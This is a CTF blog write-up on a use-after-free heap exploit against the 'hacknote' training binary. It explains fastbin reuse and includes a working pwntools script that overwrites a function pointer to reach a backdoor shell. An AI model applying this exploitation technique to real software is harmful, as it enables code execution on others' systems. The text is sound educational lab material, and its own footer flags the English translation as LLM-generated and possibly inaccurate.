---
title: 「PWN」堆的第一次尝试 - UseAfterFree
description: nova在博客中分享了他首次尝试堆漏洞利用，专注于“Use After Free”，并且提到他将来会介绍“双重释放和解除链接”的问题。他引用了CTF-WIKI上的例题`hacknote`，并解释了使用不同的`libc`版本为动态解释器的方法。
pubDate: 2022-06-30
tags:
- CTF
- Pwn
authors:
- nova

---
After dawdling for so long, I finally managed to dive into the world of HEAP.

Thanks to Ayang's (bushi) guidance.

Let's first take a look at the simplest `Use After Free` exploit, which requires minimal understanding of heap concepts. I will probably write about `Double Free + Unlink` tomorrow.

I used the original challenge [hacknote](https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote) from `CTF-WIKI`.

{/* truncate */}

# Changing the `libc` used as a dynamic interpreter in Pwntools

I would like to mention a pitfall I encountered on the way. `libc-2.31` has made significant changes to the heap management mechanism, so the debugging approach based on `CTF-WIKI` didn't work initially. Therefore, I will explain how to change the dynamic interpreter.

Firstly, you need two tools, [glibc-all-in-all](https://github.com/matrix1001/glibc-all-in-one) and [patchelf](https://github.com/NixOS/patchelf).

Please refer to the `README.md` for installation instructions.

After downloading the corresponding `libc`, use `patchelf` to set the interpreter for the `ELF` file.

```sh
patchelf --set-interpreter /path/to/libc/libc-2.23.so --set-rpath /path/to/libc/ ./binary_file_name

# For Example: patchelf --set-rpath /home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ --set-interpreter /home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./use_after_free
```

## Use After Free

The main cause of this vulnerability is a `dangling pointer`—the memory pointer is not set to NULL after `free()`. If other code modifies the content of this memory at this point, using this memory again will lead to issues.

## Source

```sh
gcc -m64 -fno-stack-protector -no-pie -z execstack -g use_after_free.c -o use_after_free
# Make
```

No protections, 64-bit.

The program defines a structure with a pointer `printnote` pointing to the `print_note_content` method and a pointer `content`.

The implementation of `add_note()` is as follows: Firstly, it `malloc` a `struct note`, which is 16 bytes in the heap. After that, it allocates `size` bytes in the heap for `content`.

Take a look at `del_note()`. After deleting a node, `count` does not change—this limits the number of times we can `add_note()`, and also provides convenience for our exploit. Also, after `free`, `notelist[idx]` is not set to `NULL`, which opens the door for our `Use After Free` exploitation.

`print_note()` calls `notelist[idx]->printnote(notelist[idx])`. If we can modify the memory of `notelist[idx]->printnote`, we can achieve the effect of executing a backdoor function.

## Exploit

Since `struct note` is a fixed `0x20`-size `chunk`, we mainly think about the exploitation related to `fastbins`.

Since `fastbins` maintains several linked lists from `0x20` to `0x80` and has a last-in, first-out mechanism, we can consider the following scenario:

If we allocate two `0x20` notes, let's call them `note1` and `note2`, the program should have 4 heap segments—two `0x20`-sized `note1_struct_note` and `note2_struct_note`, and two `0x30`-sized `note1` and `note2` (excluding the one byte for `PREV_IN_USE`).

If we then free both notes, the `fastbins` should look like this:

```sh
fastbins:
    0x20: note2_struct_note_addr -> note1_struct_note_addr
    0x30: note2 -> note1
```

What if we then allocate another `0x10` note `note3`? Based on the recycling mechanism of `fastbins`, we can infer that:

The first `note2_struct_note_addr` will be allocated to `note3_struct_note_addr`, while the second `note1_struct_note_addr` will be allocated to our controllable `note3`.

Now, if we change the `content` of `note3` to a backdoor function and call `print_note(0)`:

As you'd expect, the backdoor function will be executed.

```python
from pwn import *

sh = process(["./use_after_free"])

def add_note(size, content):
    sh.recvuntil(b"Your choice :")
    sh.sendline(b"1")
    sh.recvuntil(b"Note size :")
    sh.sendline(str(size).encode())
    sh.recvuntil(b"Content :")
    sh.sendline(content)

def delete_note(index):
    sh.recvuntil(b"Your choice :")
    sh.sendline(b"2")
    sh.recvuntil(b"Index :")
    sh.sendline(f"{index}".encode())

def print_note(index):
    sh.recvuntil(b"Your choice :")
    sh.sendline(b"3")
    sh.recvuntil(b"Index :")
    sh.sendline(f"{index}".encode())

# gdb.attach(sh)
add_note(32, b"aaaa")
add_note(32, b"bbbb")
delete_note(0)
delete_note(1)
add_note(16, p64(0x4015f9)) # addr of magic()
print_note(0)
sh.interactive()
```

## GDB

Theoretical knowledge alone is incomplete without practical debugging using `GDB`.

Based on the explanation above, let's debug at the second `add_note()`, second `delete_note()`, and the last `add_note()`:

After adding:

![heap after adding](https://oss.nova.gal/img/image-20220314221552787.png)

![heap after adding](https://oss.nova.gal/img/image-20220314221633396.png)

`0x401256` is the address of `print_note_content()`, and `0xd04030` and `0xd04080` are the addresses of `content`.

After deleting:

![heap after deleting](https://oss.nova.gal/img/image-20220314221804318.png)

![heap after deleting](https://oss.nova.gal/img/image-20220314221824810.png)

![heap after deleting](https://oss.nova.gal/img/image-20220314221944311.png)

Different-sized chains enter different `fastbins`.

Final state:

![heap final](https://oss.nova.gal/img/image-20220314222135890.png)

![heap final](https://oss.nova.gal/img/image-20220314222201810.png)

![heap final](https://oss.nova.gal/img/image-20220314222221269.png)

After the last addition, we observe that the two `0x20`-sized heaps in `fastbins` have been recycled! The address of the backdoor function `0x4015f9` as the `content` has been written to the location of the initial `print_note_content()`.

At this point, running `print_note()` will execute the backdoor function.

![Shell!](https://oss.nova.gal/img/image-20220314222613059.png)

:::info
This Content is generated by LLM and might be wrong / incomplete, refer to Chinese version if you find something wrong.
:::

{/* AI */}
